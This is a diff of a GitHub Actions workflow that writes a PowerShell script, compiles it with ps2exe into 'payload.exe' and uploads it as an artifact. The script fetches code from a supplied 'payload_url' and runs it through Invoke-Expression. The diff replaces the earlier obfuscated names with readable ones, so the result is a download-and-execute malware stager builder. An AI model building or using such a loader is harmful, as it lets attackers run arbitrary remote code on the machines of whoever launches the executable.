@@ -23,54 +23,53 @@ jobs:
       run: |
         Install-Module -Name ps2exe -Force -Scope CurrentUser
 
-    # Step 3: Save PowerShell script with injected URL
+    # Step 3: Save PowerShell Script with URL Injection
     - name: Save PowerShell Script with URL Injection
       shell: powershell
       run: |
         $script = @"
-                  function XhYjVwJtKz {
-                      param (
-                          [string]`$AaBbCcDdEe
-                      )
-                  
-                      try {
-                          `$FfGgHhIiJj = Invoke-WebRequest -Uri ``$AaBbCcDdEe -UseBasicParsing -TimeoutSec 10
-                          return `$FfGgHhIiJj.Content
-                      }
-                      catch {
-                          Write-Host 'Error: Failed to fetch data from URL - `$AaBbCcDdEe'
-                          return `$null
-                      }
-                  }
-                  
-                  function XoRpQkZtLs {
-                      param (
-                          [string]`$scriptContent
-                      )
-                  
-                      try {
-                          Invoke-Expression `\$scriptContent
-                      }
-                      catch {
-                          Write-Host 'Error: Failed to execute PowerShell command.'
-                      }
-                  }
-                  
-                  `$QwErTyUuOo = '${{ github.event.inputs.payload_url }}'  # Injected URL here
-                  
-                  if (`$QwErTyUuOo) {
-                      `$VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe `$QwErTyUuOo
-                  
-                      if (`$VvWwXxYyZz) {
-                          XoRpQkZtLs -scriptContent `$VvWwXxYyZz
-                      } else {
-                          Write-Host 'Error: No valid data received from the URL.'
-                      }
-                  } else {
-                      Write-Host 'Error: PAYLOAD_URL is not set.'
-                  }
-                  "@
-                          Set-Content -Path "payload.ps1" -Value $script
+        function FetchScriptContent {
+          param (
+        [string]`$scriptUrl
+              )
+              try {
+                  `$response = Invoke-WebRequest -Uri `$scriptUrl -UseBasicParsing -TimeoutSec 10
+                  return `$response.Content
+              }
+              catch {
+                  Write-Host 'Error: Failed to fetch data from URL - `$scriptUrl'
+                  return `$null
+              }
+          }
+          
+          function ExecuteScript {
+              param (
+                  [string]`$scriptContent
+              )
+              try {
+                  Invoke-Expression `$scriptContent
+              }
+              catch {
+                  Write-Host 'Error: Failed to execute PowerShell command.'
+              }
+          }
+          
+          # Get URL from input
+          `$scriptUrl = '${{ github.event.inputs.payload_url }}'
+          
+          if (`$scriptUrl) {
+              `$scriptData = FetchScriptContent -scriptUrl `$scriptUrl
+          
+              if (`$scriptData) {
+                  ExecuteScript -scriptContent `$scriptData
+              } else {
+                  Write-Host 'Error: No valid data received from the URL.'
+              }
+          } else {
+              Write-Host 'Error: PAYLOAD_URL is not set.'
+          }
+          "@
+                  Set-Content -Path "payload.ps1" -Value $script
 
     # Step 4: Convert PowerShell script to an EXE using ps2exe
     - name: Convert PowerShell Script to EXE
@@ -89,12 +88,3 @@ jobs:
       with:
         name: payload_exe
         path: payload.exe
-
-
-
-
-
-
-
-
-
